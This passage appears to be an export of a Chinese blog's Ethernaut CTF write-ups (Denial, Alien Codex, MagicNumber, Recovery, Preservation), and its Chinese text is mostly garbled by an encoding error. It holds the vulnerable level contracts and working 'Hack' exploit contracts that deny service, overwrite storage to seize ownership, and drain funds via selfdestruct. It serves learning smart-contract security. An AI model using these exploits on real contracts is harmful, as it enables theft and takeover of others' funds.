çš„åœºæ™¯éœ€è¦ï¼‰å¦‚æœsuccesså€¼ä¸ºå‡ã€‚æœ‰å…³æ­¤æ–¹é¢çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…SWC-104ï¼šæœªç»æ£€æŸ¥çš„è°ƒç”¨è¿”å›å€¼ã€‚ æ— è®ºå¦‚ä½•ï¼Œå›åˆ°æˆ‘ä»¬çš„åœºæ™¯ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥åœ¨Denial withdrawå‡½æ•°å‘æˆ‘ä»¬å‘é€partnerèµ„é‡‘æ—¶å¯¹å…¶è¿›è¡Œ DoSã€‚ å› ä¸ºå‡½æ•°æ²¡æœ‰æ£€æŸ¥è¿”å›å€¼ï¼ˆä¸€èˆ¬æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªå·¨å¤§çš„é”™è¯¯ï¼Œè¯·å‚é˜… SWC-104 é—®é¢˜ï¼‰å³ä½¿æˆ‘ä»¬åœ¨è°ƒç”¨æ‰§è¡Œä¸­æ¢å¤withdrawï¼Œå‡½æ•°çš„æµç¨‹ä¹Ÿä¼šç»§ç»­ã€‚æˆ‘ä»¬å¦‚ä½•å¼ºåˆ¶åœæ­¢æ‰§è¡Œï¼Ÿ æˆ‘ä»¬å”¯ä¸€çš„é€‰æ‹©æ˜¯æ’å‡ºæ‰€æœ‰è½¬å‘çš„æ°”ä½“ï¼Œå¹¶ç”±äºâ€œæ°”ä½“ä¸è¶³â€å¼‚å¸¸è€Œä½¿æ™ºèƒ½åˆçº¦æ¢å¤ã€‚ ä¸€ç§ç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨æ— é™å¾ªç¯å¯¹çŠ¶æ€å˜é‡æ‰§è¡Œè®¡æ•°å™¨å¢åŠ  å‚è€ƒè§†é¢‘ å†™çš„æ”»å‡»åˆçº¦ï¼š 1234567891011contract Hack &#123; constructor(Denial target) &#123; target.setWithdrawPartner(address(this)); &#125; fallback() external payable &#123; assembly &#123; invalid() &#125; &#125;&#125; 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0xa22A605788d9828cb51eAd6AA5d5549cb40Da5F0 3.2 å°†å®åŠ›åœ°å€ä½œä¸ºå‚æ•°ï¼Œç”¨ä»¥éƒ¨ç½²æ”»å‡»åˆçº¦ 3.3 æäº¤æ¡ˆä¾‹ 3.4 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Alien Codex","slug":"CTFS/ethernaut/Alien Codex","date":"2023-01-19T04:10:10.000Z","updated":"2023-01-19T04:10:10.000Z","comments":true,"path":"2023/01/19/CTFS/ethernaut/Alien Codex/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/19/CTFS/ethernaut/Alien%20Codex/","excerpt":"","text":"Alien Codex1. é¢˜ç›®è¦æ±‚ 1.1 ä½ æ‰“å¼€äº†ä¸€ä¸ª Alien åˆçº¦. ç”³æ˜æ‰€æœ‰æƒæ¥å®Œæˆè¿™ä¸€å…³. è¿™å¯èƒ½æœ‰å¸®åŠ© ç†è§£Array Storageæ˜¯æ€ä¹ˆå›äº‹ ç†è§£ ABI specifications ä½¿ç”¨ä¸€ä¸ªéå¸¸ ç‹— æ–¹æ³• 1.2 é¢˜ç›®ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031// SPDX-License-Identifier: MITpragma solidity ^0.5.0;import &#x27;../helpers/Ownable-05.sol&#x27;;contract AlienCodex is Ownable &#123; bool public contact; bytes32[] public codex; modifier contacted() &#123; assert(contact); _; &#125; function make_contact() public &#123; contact = true; &#125; function record(bytes32 _content) contacted public &#123; codex.push(_content); &#125; function retract() contacted public &#123; codex.length--; &#125; function revise(uint i, bytes32 _content) contacted public &#123; codex[i] = _content; &#125;&#125; 2. åˆ†ætips: å‚è€ƒåšå®¢ 2.1 åœ¨ AlienCodex åˆçº¦ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥retract()å‡½æ•°å¯¼è‡´æ•°ç»„é•¿åº¦å‡ºç°æ•´æ•°ä¸‹æº¢codexã€‚è¿™ä¸ªä¸‹æº¢å…è®¸æˆ‘ä»¬é€šè¿‡å‡½æ•°ä¿®æ”¹åˆçº¦ä¸­çš„ä»»ä½•çŠ¶æ€å˜é‡revise()ã€‚è¯¥æ¼æ´å¯ä»¥æŒ‰å¦‚ä¸‹æ–¹å¼æ‰§è¡Œï¼š è°ƒç”¨make_contact()å‡½æ•°é€šè¿‡contacted()ä¿®é¥°ç¬¦æ£€æŸ¥ï¼Œè¦æ±‚contactä¸ºçœŸã€‚ è°ƒç”¨retract()å‡½æ•°å¯¼è‡´æ•°ç»„codexé•¿åº¦æ•´æ•°æº¢å‡º é€šè¿‡ä»¥ä¸‹æ–¹å¼æ‰¾åˆ°çŠ¶æ€å˜é‡çš„æ•£åˆ—ï¼Œownerå°±å¥½åƒå®ƒæ˜¯codexæ•°ç»„çš„ä¸€éƒ¨åˆ†ä¸€æ ·ï¼š è·å–æ•°ç»„ä¸­ç¬¬ä¸€é¡¹çš„å“ˆå¸Œå€¼codexï¼ˆå› ä¸ºå®ƒåœ¨åˆçº¦å­˜å‚¨ä¸­è¢«ç´¢å¼•ï¼‰ï¼Œå¯¹åº”äºå®ƒåœ¨åˆçº¦å­˜å‚¨ä¸­çš„æ§½ä½ã€‚è¿™å¯ä»¥é€šè¿‡è®¡ç®—ç¬¬ä¸€ä¸ªä½ç½®çš„ Keccak256 å“ˆå¸Œå€¼æ¥è·å¾—ï¼Œå› æ­¤ï¼škeccak256(0x0000000000000000000000000000000000000000000000000000000000000001)ã€‚ å–ç”±æ­¤ ( 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6) äº§ç”Ÿçš„å“ˆå¸Œå€¼ï¼Œå¹¶ä»åˆçº¦ä¸­çš„æœ€å¤§æ’æ§½æ•°é‡ä¸­å‡å»å…¶æ•´æ•°å€¼åŠ ä¸€ (2ä¸ª256âˆ’1ä¸ª), å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼š d.ä½¿ç”¨è¿™ä¸ªç»“æœå€¼ä½œä¸ºrevise()è¦ä¿®æ”¹çš„iæ•°ç»„çš„ï¼ˆç´¢å¼•)å’Œæˆ‘ä»¬çš„åœ°å€ã€‚codex``_content 2.2 å‚è€ƒè§†é¢‘ å†™çš„æ”»å‡»åˆçº¦ 12345678910111213141516171819202122232425interface IAlienCodex &#123; function owner() external view returns (address); function make_contact() external; function revise(uint i, bytes32 _content) external; function retract() external;&#125;contract Hack &#123; constructor(IAlienCodex target) &#123; target.make_contact(); target.retract(); uint256 h = uint256(keccak256(abi.encode(uint256(1)))); uint256 i = uint256(0) - h; // unchecked &#123; // i = i - h; // &#125; target.revise(i, bytes32(uint256(uint160(msg.sender)))); require(target.owner() == msg.sender, &quot;Hack Failed&quot;); &#125;&#125; 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0x175A96bA1755F20E85ff80089ec9000dD0df463e 3.2 å°†å®ä¾‹åœ°å€ä½œä¸ºå‚æ•°è¿›è¡Œå¯¹æ”»å‡»åˆçº¦çš„éƒ¨ç½² 3.3 æäº¤æ¡ˆä¾‹ 3.4 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"MagicNumber","slug":"CTFS/ethernaut/MagicNumber","date":"2023-01-19T01:10:10.000Z","updated":"2023-01-19T01:10:10.000Z","comments":true,"path":"2023/01/19/CTFS/ethernaut/MagicNumber/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/19/CTFS/ethernaut/MagicNumber/","excerpt":"","text":"MagicNumber1. é¢˜ç›®è¦æ±‚ 1.1 To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number. Easy right? Wellâ€¦ thereâ€™s a catch. The solverâ€™s code needs to be really tiny. Really reaaaaaallly tiny. Like freakinâ€™ really really itty-bitty tiny: 10 opcodes at most. Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. Thatâ€™s right: Raw EVM bytecode. Good luck 1.2 è¯‘ï¼šè¦è§£å†³è¿™ä¸ªå…³å¡ï¼Œä½ åªéœ€è¦å‘ Ethernaut æä¾›ä¸€ä¸ªï¼Œä¸€ä¸ªç”¨æ­£ç¡®çš„æ•°å­—Solverå“åº”çš„åˆçº¦ã€‚whatIsTheMeaningOfLife() ç®€å•å§ï¼Ÿå—¯â€¦æœ‰ä¸€ä¸ªé—®é¢˜ã€‚ æ±‚è§£å™¨çš„ä»£ç éœ€è¦éå¸¸å°ã€‚çœŸçš„å¾ˆå°ã€‚å°±åƒ freakinâ€™ really really itty-bitty tinyï¼šæœ€å¤š 10 ä¸ªæ“ä½œç ã€‚ æç¤ºï¼šä¹Ÿè®¸æ˜¯æ—¶å€™æš‚æ—¶ç¦»å¼€ Solidity ç¼–è¯‘å™¨çš„èˆ’é€‚ç¯å¢ƒï¼Œå¹¶æ‰‹åŠ¨æ„å»ºè¿™ä¸ª O_oã€‚æ²¡é”™ï¼šåŸå§‹ EVM å­—èŠ‚ç ã€‚ ç¥ä½ å¥½è¿ï¼ 1.3 é¢˜ç›®ä»£ç ï¼š 12345678910111213141516171819202122232425// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract MagicNum &#123; address public solver; constructor() &#123;&#125; function setSolver(address _solver) public &#123; solver = _solver; &#125; /* ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____ __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___ ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__ ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___ ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____ __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________ _\\///////////\\\\\\//____/\\\\\\/___________ ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_ ___________\\///_____\\///////////////__ */&#125; - 2. åˆ†ætipsï¼š å‚è€ƒåšå®¢ 2.1æœ‰ä¸€ä¸ªåœ¨è°ƒç”¨æ—¶whatIsTheMeaningOfLifeåº”ç­”0x000000000000000000000000000000000000000000000000000000000000002a(bytes32) çš„å‡½æ•°ã€‚è¿™æ˜¯åè¿›åˆ¶çš„ 42 çš„åå…­è¿›åˆ¶è½¬æ¢ã€‚2ï¼‰æˆ‘ä»¬çš„åˆçº¦ä»£ç å¿…é¡»å°äº10å­—èŠ‚ è¿™äº›è¦æ±‚ä¼¼ä¹æ— æ³•å®ç°ï¼Œå³ä½¿ä½¿ç”¨åŸå§‹å­—èŠ‚ç æ¥å®šä¹‰å‡½æ•°ã€å¤„ç†å‡½æ•°é€‰æ‹©å™¨ç­‰ï¼Œä¹Ÿå°†è¿œè¿œè¶…è¿‡ 10 å­—èŠ‚çš„ä»£ç ã€‚ ä½†æ˜¯æˆ‘ä»¬çœŸçš„éœ€è¦æœ‰é‚£ä¸ªåŠŸèƒ½å—ï¼Ÿæœ€åï¼Œæˆ‘ä»¬å¿…é¡»å¡‘é€ åˆçº¦ä»£ç æ‰èƒ½é€šè¿‡æŒ‘æˆ˜ã€‚å¦‚æœæˆ‘ä»¬çš„åˆåŒï¼Œæ— è®ºå®ƒå¦‚ä½•æ‰§è¡Œï¼Œåªè¿”å›42æ€ä¹ˆåŠï¼Ÿ è¿™å°±æ˜¯è¯€çªï¼å¦‚æœä½ è®¤ä¸ºå®ƒå°±åƒæ‹¥æœ‰ä¸€ä¸ª Solidity æ™ºèƒ½åˆçº¦è€Œä¸æ˜¯åªæœ‰ä¸€ä¸ªfallbackå‡½æ•°ï¼Œé‚£ä¹ˆæ— è®ºä½ å°è¯•ä½çº§è°ƒç”¨å“ªä¸ªå‡½æ•°ï¼Œå®ƒéƒ½å°†å§‹ç»ˆä¸”åªæ‰§è¡Œè¯¥fallbackå‡½æ•°ã€‚ 2.2 ç°åœ¨æˆ‘ä»¬éœ€è¦éƒ¨ç½²æˆ‘ä»¬åˆšåˆšåœ¨ä¸Šä¸€èŠ‚ä¸­ç¼–å†™çš„æœ€å°åˆçº¦ã€‚å½“ä¸€ä¸ªæ™ºèƒ½åˆçº¦è¢«åˆ›å»ºæ—¶ï¼ˆvia CREATEor CREATE2opcodeï¼‰ï¼ŒEVM ä¼šæ‰§è¡Œä¸€æ¬¡æ„é€ å‡½æ•°ä»£ç ï¼Œå¹¶ä¸”éƒ¨ç½²çš„æ™ºèƒ½åˆçº¦çš„ä»£ç ä¼šè¢« opcode è¿”å›RETURNï¼ˆè¿™ä¸ªè¿”å›çš„ä»£ç ç§°ä¸ºè¿è¡Œæ—¶ä»£ç ï¼Œå®ƒæ˜¯å°†è¦æ‰§è¡Œçš„ä»£ç å½“æ‚¨ä¸æ™ºèƒ½åˆçº¦äº¤äº’æ—¶ï¼‰ å‚è€ƒè§†é¢‘ å†™çš„æ”»å‡»åˆçº¦ï¼š 12345678910111213contract Hack &#123; constructor(MagicNum target) &#123; bytes memory bytecode = hex&quot;69602a60005260206000f3600052600a6016f3&quot;; address addr; assembly &#123; addr := create(0, add(bytecode, 0x20), 0x13) &#125; require(addr != address(0)); target.setSolver(addr); &#125;&#125; 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0x5072f4af6D9B0907833C43b199000347158f685d 3.2 ä¼ å…¥å®ä¾‹åœ°å€éƒ¨ç½²æ”»å‡»åˆçº¦ 3.3 æäº¤å®ä¾‹ 3.4 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Recovery","slug":"CTFS/ethernaut/Recovery","date":"2023-01-18T11:10:10.000Z","updated":"2023-01-18T11:10:10.000Z","comments":true,"path":"2023/01/18/CTFS/ethernaut/Recovery/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/18/CTFS/ethernaut/Recovery/","excerpt":"","text":"Recovery1. é¢˜ç›®è¦æ±‚ 1.1 åˆçº¦åˆ›å»ºè€…æ„å»ºäº†ä¸€ä¸ªéå¸¸ç®€å•çš„ä»£å¸å·¥å‚åˆçº¦ã€‚ ä»»ä½•äººéƒ½å¯ä»¥è½»æ¾åˆ›å»ºæ–°ä»£å¸ã€‚ åœ¨éƒ¨ç½²äº†ä¸€ä¸ªä»£å¸åˆçº¦åï¼Œåˆ›å»ºè€…å‘é€äº† 0.001 ä»¥å¤ªå¸ä»¥è·å¾—æ›´å¤šä»£å¸ã€‚ åè¾¹ä»–ä»¬ä¸¢å¤±äº†åˆçº¦åœ°å€ã€‚ å¦‚æœæ‚¨èƒ½ä»ä¸¢å¤±çš„çš„åˆçº¦åœ°å€ä¸­æ‰¾å›(æˆ–ç§»é™¤)ï¼Œåˆ™é¡ºåˆ©é€šè¿‡æ­¤å…³ã€‚ 1.2 é¢˜ç›®ä»£ç  12345678910111213141516171819202122232425262728293031323334353637383940// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Recovery &#123; //generate tokens function generateToken(string memory _name, uint256 _initialSupply) public &#123; new SimpleToken(_name, msg.sender, _initialSupply); &#125;&#125;contract SimpleToken &#123; string public name; mapping (address =&gt; uint) public balances; // constructor constructor(string memory _name, address _creator, uint256 _initialSupply) &#123; name = _name; balances[_creator] = _initialSupply; &#125; // collect ether in return for tokens receive() external payable &#123; balances[msg.sender] = msg.value * 10; &#125; // allow transfers of tokens function transfer(address _to, uint _amount) public &#123; require(balances[msg.sender] &gt;= _amount); balances[msg.sender] = balances[msg.sender] - _amount; balances[_to] = _amount; &#125; // clean up after ourselves function destroy(address payable _to) public &#123; selfdestruct(_to); &#125;&#125; 2. åˆ†ætipsï¼š å‚è€ƒåšå®¢ 2.1åˆçº¦åœ°å€æ˜¯ç¡®å®šæ€§çš„ï¼Œå¯ä»¥ä»åˆçº¦çš„éƒ¨ç½²è€…åœ°å€å’Œæ¥è‡ªéƒ¨ç½²è€…çš„éƒ¨ç½²äº¤æ˜“çš„éšæœºæ•°ä¸­å¾—å‡ºã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä»ä¸€å¼€å§‹å°±æœ‰è¿™äº›ä¿¡æ¯ï¼š åˆåŒéƒ¨ç½²è€…åœ°å€ï¼ˆæˆ‘ä»¬çš„ä¾‹å­ï¼Œåœ¨æˆ‘çš„ä¾‹å­ä¸­0xc03f501C5987CAaC9e4470849f13eEA338b76E9fï¼‰ éƒ¨ç½²ç¬¬ä¸€ä¸ª SimpleToken çš„éšæœºæ•°ï¼ˆ1 å¦‚ç»ƒä¹ æ‰€è¿°ï¼‰ å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ¾è®¡ç®—å‡ºç¬¬ä¸€ä¸ª SimpleToken éƒ¨ç½²çš„åˆçº¦åœ°å€ï¼Œç»“æœä¸º0xa26D4caf289D657F24f8d2D26f0DFe99a0B312db. ä»æŠ€æœ¯ä¸Šè®²ï¼Œè¿™é‡Œå¾ˆå®¹æ˜“ä½œå¼Šï¼Œå› ä¸ºé€šè¿‡æ£€æŸ¥å®ä¾‹åˆçº¦çš„å†…éƒ¨äº¤æ˜“ï¼Œå¾ˆå®¹æ˜“åœ¨åŒºå—æµè§ˆå™¨ä¸Šçœ‹åˆ°æˆ‘ä»¬è¦æ’ç©ºçš„åˆçº¦çš„åˆçº¦åœ°å€ã€‚ç„¶è€Œï¼Œç»ƒä¹ çš„ç›®çš„æ˜¯æˆ‘ä»¬è‡ªå·±æ¨å¯¼å‡ºåœ°å€ã€‚ æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬ç°åœ¨è¦åšçš„å°±æ˜¯è°ƒç”¨destroy()SimpleToken åˆçº¦ä¸­çš„å‡½æ•°ï¼Œå¹¶å°†å…¶ä¸­çš„èµ„é‡‘å®šå‘åˆ°ä»»ä½•åœ°å€ï¼Œä»¥ä¾¿å°†ç»ƒä¹ æ ‡è®°ä¸ºå·²å®Œæˆã€‚ 2.2 åšæ³•ï¼š ä¸€æ—¦æˆ‘ä»¬æœ‰äº†è¿™ä¸¤ä¸ªç»†èŠ‚ï¼ˆéƒ¨ç½²åœ°å€ï¼Œéšæœºæ•°ï¼‰ï¼Œå°±åƒæˆ‘åœ¨è§£å†³æ–¹æ¡ˆä¸­æè¿°çš„é‚£æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ python ä¸­ï¼ˆæˆ–ç›´æ¥åœ¨ solidity ä¸­ï¼‰ç¼–å†™ä¸€ä¸ªå‡½æ•°æ¥è·å–åœ°å€ã€‚ä½œä¸ºä¸€ä¸ªè¶³æ™ºå¤šè°‹çš„å¼€å‘äººå‘˜ï¼Œå³ä½¿æˆ‘çŸ¥é“å¦‚ä½•è®¡ç®—å®ƒï¼Œæˆ‘ä»ç„¶å†³å®šå» StackExchange ä¸­æ‰¾åˆ°ä¸€ä¸ªç°æˆçš„è§£å†³æ–¹æ¡ˆä»¥è·³è¿‡è¿™ä¸ªï¼š # compute address of a given contract to be deployed from # the deployer address + nonce, as stated in the Section 7 # of the Ethereum yellowpaper for contracts created using CREATE def mk_contract_address(sender: str, nonce: int) -&gt; str: &quot;&quot;&quot;Create a contract address using eth-utils. # Modified from Mikko Ohtamaa&#39;s original answer which was later # edited by Utgarda # Obtained from https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed &quot;&quot;&quot; sender_bytes = to_bytes(hexstr=sender) raw = rlp.encode([sender_bytes, nonce]) h = keccak(raw) address_bytes = h[12:] return to_checksum_address(address_bytes) 12345678910111213141516171819202122- ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥æ’å…¥è¿™äº›å€¼å¹¶æ‰¾åˆ°ç¬¬ä¸€ä¸ª SimpleToken éƒ¨ç½²çš„åœ°å€ï¼š- &gt; first_simpletoken_contract_address = mk_contract_address(recovery.address, 1)- è¿æ¥åˆ°è¿™ä¸ªåˆçº¦å¹¶è°ƒç”¨`destroy()`å‡½æ•°ï¼Œå°†èµ„é‡‘å‘é€åˆ°æˆ‘çš„åœ°å€ã€‚- &gt; simpletoken.destroy(acc.address, _**from**)- æ”»å‡»åˆçº¦æ¥è‡ª [å‚è€ƒè§†é¢‘](https://www.youtube.com/watch?v=K8AFyNiuTXs) ```solidity contract Dev &#123; function recover(address sender) external pure returns (address) &#123; address addr = address(uint160(uint256( keccak256(abi.encodePacked( bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01) )) ))); return addr; &#125; &#125; 3. è§£é¢˜ 3.1 è·å–å®ä¾‹åœ°å€ï¼š0x7802095a90641cd76543bc7df683d24D4bdd4436 3.2 éƒ¨ç½²Devåˆçº¦ï¼Œè°ƒç”¨åˆçº¦ä¸­çš„recover() å‡½æ•°ï¼Œä¼ å…¥çš„å½¢å‚ä¸ºå…³å¡å®ä¾‹ 3.3 å°†è°ƒç”¨recover() å‡½æ•° è¿”å›çš„åœ°å€å¸¦åˆ°åŒºå—é“¾æµè§ˆå™¨ä¸ŠæŸ¥çœ‹äº¤æ˜“ 3.3 ä½¿ç”¨recover() å‡½æ•° è¿”å›çš„åœ°å€è·å–éƒ¨ç½²çš„SimpleTokenåˆçº¦ï¼Œå¹¶å°†è°ƒç”¨SimpleTokenåˆçº¦ä¸­çš„destroy() å‡½æ•°ï¼Œä¼ å…¥çš„å½¢å‚ä¸ºè‡ªå·± çš„é’±åŒ…åœ°å€ 3.4 æ‰§è¡Œdestroy() å‡½æ•°ä¹‹åï¼Œåˆ°åŒºå—é“¾æµè§ˆå™¨ä¸­å†å»æŸ¥çœ‹åœ°å€çš„ä½™é¢ä¸º0 3.5 æäº¤æ¡ˆä¾‹ 3.6 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Preservation","slug":"CTFS/ethernaut/Preservation","date":"2023-01-18T09:10:10.000Z","updated":"2023-01-18T09:10:10.000Z","comments":true,"path":"2023/01/18/CTFS/ethernaut/Preservation/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/18/CTFS/ethernaut/Preservation/","excerpt":"","text":"Preservation1.é¢˜ç›®è¦æ±‚ 1.1 è¯¥åˆçº¦åˆ©ç”¨åº“åˆçº¦ä¿å­˜ 2 ä¸ªä¸åŒæ—¶åŒºçš„æ—¶é—´æˆ³ã€‚åˆçº¦çš„æ„é€ å‡½æ•°è¾“å…¥ä¸¤ä¸ªåº“åˆçº¦åœ°å€ç”¨äºä¿å­˜ä¸åŒæ—¶åŒºçš„æ—¶é—´æˆ³ã€‚ é€šå…³æ¡ä»¶ï¼šå°è¯•å–å¾—åˆçº¦çš„æ‰€æœ‰æƒï¼ˆownerï¼‰ã€‚ å¯èƒ½æœ‰å¸®åŠ©çš„æ³¨æ„ç‚¹ï¼š æ·±å…¥äº†è§£ Solidity å®˜ç½‘æ–‡æ¡£ä¸­åº•å±‚æ–¹æ³• delegatecall çš„å·¥ä½œåŸç†ï¼Œå®ƒå¦‚ä½•åœ¨é“¾ä¸Šå’Œåº“åˆçº¦ä¸­çš„ä½¿ç”¨è¯¥æ–¹æ³•ï¼Œä»¥åŠæ‰§è¡Œçš„ä¸Šä¸‹æ–‡èŒƒå›´ã€‚ ç†è§£ delegatecall çš„ä¸Šä¸‹æ–‡ä¿ç•™çš„å«ä¹‰ ç†è§£åˆçº¦ä¸­çš„å˜é‡æ˜¯å¦‚ä½•å­˜å‚¨å’Œè®¿é—®çš„ ç†è§£ä¸åŒç±»å‹ä¹‹é—´çš„å¦‚ä½•è½¬æ¢ 1.2 é¢˜ç›®ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Preservation &#123; // public library contracts address public timeZone1Library; address public timeZone2Library; address public owner; uint storedTime; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;)); constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123; timeZone1Library = _timeZone1LibraryAddress; timeZone2Library = _timeZone2LibraryAddress; owner = msg.sender; &#125; // set the time for timezone 1 function setFirstTime(uint _timeStamp) public &#123; timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); &#125; // set the time for timezone 2 function setSecondTime(uint _timeStamp) public &#123; timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); &#125;&#125;// Simple library contract to set the timecontract LibraryContract &#123; // stores a timestamp uint storedTime; function setTime(uint _time) public &#123; storedTime = _time; &#125;&#125; 2. åˆ†æå‚è€ƒæ–‡ç« 1 å‚è€ƒæ–‡ç« 2ç¬¬ä¸€ç±»åˆ†ææ–¹æ³• 2.1 ç›®æ ‡ï¼šå£°æ˜å¯¹ç»™å®šå®ä¾‹çš„æ‰€æœ‰æƒ 2.2 å®ƒæœ‰ä¸€ä¸ªuint256 storedTimeçŠ¶æ€å˜é‡å’Œä¸€ä¸ª setter å‡½æ•°setTimeï¼Œå¯ä»¥æ ¹æ®ç”¨æˆ·çš„è¾“å…¥æ›´æ–°çŠ¶æ€å˜é‡ã€‚ 12345678910// Simple library contract to set the timecontract LibraryContract &#123; // stores a timestamp uint storedTime; function setTime(uint _time) public &#123; storedTime = _time; &#125;&#125; 2.3 åˆ†æä¸»å‡½æ•°çš„ä»£ç  å®ƒæœ‰äº”ä¸ªä¸åŒçš„çŠ¶æ€å˜é‡ address public timeZone1Libraryç¬¬ä¸€æ—¶åŒºå›¾ä¹¦é¦†åœ°å€ address public timeZone2Libraryç¬¬äºŒæ—¶åŒºå›¾ä¹¦é¦†åœ°å€ address public owneræ‰€æœ‰è€…çš„åœ°å€ uint256 storedTimeä¸¤ä¸ªæ—¶åŒºåº“ä¹‹ä¸€å­˜å‚¨çš„æ—¶é—´ bytes4 constant setTimeSignature``setTimeæ—¶åŒºåº“ä¸­å‡½æ•°çš„ç­¾åã€‚constantç”±äºå…³é”®å­—ï¼Œè¿™ä¸æ˜¯çœŸæ­£çš„çŠ¶æ€å˜é‡ åˆçº¦çš„the constructorof the contract é‡‡ç”¨ä¸¤ç§addressç±»å‹çš„è¾“å…¥æ¥è®¾ç½®ä¸¤ä¸ªåº“åœ°å€å¹¶å°†æ‰€æœ‰è€…è®¾ç½®ä¸ºmsg.sender. ç„¶åæˆ‘ä»¬æœ‰ä¸¤ä¸ªä¸åŒçš„åŠŸèƒ½ function setFirstTime(uint256 _timeStamp) public function setSecondTime(uint256 _timeStamp) public å®ƒä»¬æ˜¯ç›¸åŒçš„ï¼Œå®ƒä»¬åªæ˜¯åœ¨ä¸¤ä¸ªä¸åŒçš„æ—¶åŒºåº“ä¸Šæ‰§è¡Œç›¸åŒçš„ä»£ç  å½“Preservationåˆçº¦æ‰§è¡Œæ—¶setFirstTime(100)ï¼Œå®ƒä¼šè°ƒç”¨LibraryContract.setTime(100)via delegatecallã€‚ æ‰§è¡Œçš„ä»£ç æ¥è‡ªåˆçº¦LibraryContractï¼Œä½†ä½¿ç”¨çš„ä¸Šä¸‹æ–‡æ˜¯æ‰§è¡Œæ“ä½œç çš„ä¸Šä¸‹æ–‡delegatecallã€‚å½“æˆ‘ä»¬è°ˆè®ºä¸Šä¸‹æ–‡æ—¶ï¼Œæˆ‘ä»¬æŒ‡çš„æ˜¯å­˜å‚¨ã€å½“å‰å‘é€è€…( msg.sender) å’Œå½“å‰å€¼( msg.value)ã€‚ 